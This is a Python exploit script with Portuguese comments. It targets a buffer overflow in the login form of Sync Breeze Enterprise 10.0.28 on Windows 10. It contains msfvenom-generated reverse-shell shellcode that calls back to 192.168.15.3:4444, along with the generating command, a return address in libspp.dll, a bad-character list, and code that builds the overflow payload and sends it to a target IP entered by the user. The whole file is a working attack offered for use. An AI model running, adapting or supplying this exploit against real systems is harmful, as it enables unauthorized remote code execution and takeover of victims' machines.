# -*- coding: utf-8 -*-

#!/usr/bin/python
import socket

# - SOFTWARE TESTADO
# Sync Breeze Enterprise 10.0.28 [http://www.syncbreeze.com/setups/syncbreezeent_setup_v10.0.28.exe]

# - SISTEMA OPERACIONAL TESTADO
# Windows 10 Enterprise x64

# - BAD CHARS
# \x00\x0a\x0d\x25\x26\x2b\x3d

# - ENDEREÇO DE RETORNO
# 0x10090c83 --> libspp.dll

# - SHELLCODE: REVERSE SHELL 192.168.15.3:4444
# msfvenom -p windows/shell_reverse_tcp lhost=192.168.15.3 lport=4444 exitfunc=thread -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f c

shellcode = ("\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\xb1\xb3\x4c\xb7\x83\xee\xfc\xe2\xf4\x4d\x5b\xce\xb7\xb1\xb3"
"\x2c\x3e\x54\x82\x8c\xd3\x3a\xe3\x7c\x3c\xe3\xbf\xc7\xe5\xa5"
"\x38\x3e\x9f\xbe\x04\x06\x91\x80\x4c\xe0\x8b\xd0\xcf\x4e\x9b"
"\x91\x72\x83\xba\xb0\x74\xae\x45\xe3\xe4\xc7\xe5\xa1\x38\x06"
"\x8b\x3a\xff\x5d\xcf\x52\xfb\x4d\x66\xe0\x38\x15\x97\xb0\x60"
"\xc7\xfe\xa9\x50\x76\xfe\x3a\x87\xc7\xb6\x67\x82\xb3\x1b\x70"
"\x7c\x41\xb6\x76\x8b\xac\xc2\x47\xb0\x31\x4f\x8a\xce\x68\xc2"
"\x55\xeb\xc7\xef\x95\xb2\x9f\xd1\x3a\xbf\x07\x3c\xe9\xaf\x4d"
"\x64\x3a\xb7\xc7\xb6\x61\x3a\x08\x93\x95\xe8\x17\xd6\xe8\xe9"
"\x1d\x48\x51\xec\x13\xed\x3a\xa1\xa7\x3a\xec\xdb\x7f\x85\xb1"
"\xb3\x24\xc0\xc2\x81\x13\xe3\xd9\xff\x3b\x91\xb6\x4c\x99\x0f"
"\x21\xb2\x4c\xb7\x98\x77\x18\xe7\xd9\x9a\xcc\xdc\xb1\x4c\x99"
"\xe7\xe1\xe3\x1c\xf7\xe1\xf3\x1c\xdf\x5b\xbc\x93\x57\x4e\x66"
"\xdb\xdd\xb4\xdb\x8c\x1f\xbe\xb0\x24\xb5\xb1\xa2\x10\x3e\x57"
"\xd9\x5c\xe1\xe6\xdb\xd5\x12\xc5\xd2\xb3\x62\x34\x73\x38\xbb"
"\x4e\xfd\x44\xc2\x5d\xdb\xbc\x02\x13\xe5\xb3\x62\xd9\xd0\x21"
"\xd3\xb1\x3a\xaf\xe0\xe6\xe4\x7d\x41\xdb\xa1\x15\xe1\x53\x4e"
"\x2a\x70\xf5\x97\x70\xb6\xb0\x3e\x08\x93\xa1\x75\x4c\xf3\xe5"
"\xe3\x1a\xe1\xe7\xf5\x1a\xf9\xe7\xe5\x1f\xe1\xd9\xca\x80\x88"
"\x37\x4c\x99\x3e\x51\xfd\x1a\xf1\x4e\x83\x24\xbf\x36\xae\x2c"
"\x48\x64\x08\xac\xaa\x9b\xb9\x24\x11\x24\x0e\xd1\x48\x64\x8f"
"\x4a\xcb\xbb\x33\xb7\x57\xc4\xb6\xf7\xf0\xa2\xc1\x23\xdd\xb1"
"\xe0\xb3\x62")

# 780 BYTES PARA SOBRESCREVER O EAX
# 4 BYTES PARA SOBRESCREVER O EIP (ESCRITO EM LITTLE ENDIAN)
# 16 NO-OPERATIONS
# SHELLCODE
dados = "A" * 780 + "\x83\x0c\x09\x10" + "\x90" * 16 + shellcode

# CALCULA O TAMANHO DO BODY DO REQUEST PARA MODIFICAÇÃO DINAMICA DO HEADER
tam = len(dados) + 20

# PARA DIGITAR IP E PORTA ALVO
ip = raw_input("\nTarget IP: ")
porta = raw_input("Port: ")

# MONTA O HEADER + BODY DO REQUEST
request="POST /login HTTP/1.1\r\n"
request+="Host: "+str(ip)+"\r\n"
request+="Content-Length: "+str(tam)+"\r\n"
request+="Cache-Control: max-age=0\r\n"
request+="Upgrade-Insecure-Requests: 1\r\n"
request+="Origin: http://"+str(ip)+"\r\n"
request+="Content-Type: application/x-www-form-urlencoded\r\n"
request+="User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\r\n"
request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
request+="Referer: http://"+str(ip)+"/login\r\n"
request+="Accept-Encoding: gzip, deflate\r\n"
request+="Accept-Language: en-US,en;q=0.9\r\n"
request+="Connection: close\r\n"
request+="\r\n"
request+="username="+dados+"&password=A"

# ENVIA O REQUEST
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,int(porta)))
s.send(request)

# EXIBE O QUE ENVIOU
print("\n [*] "+str(len(request))+" bytes sent...")
print(" [*] Getting reverse connection...")
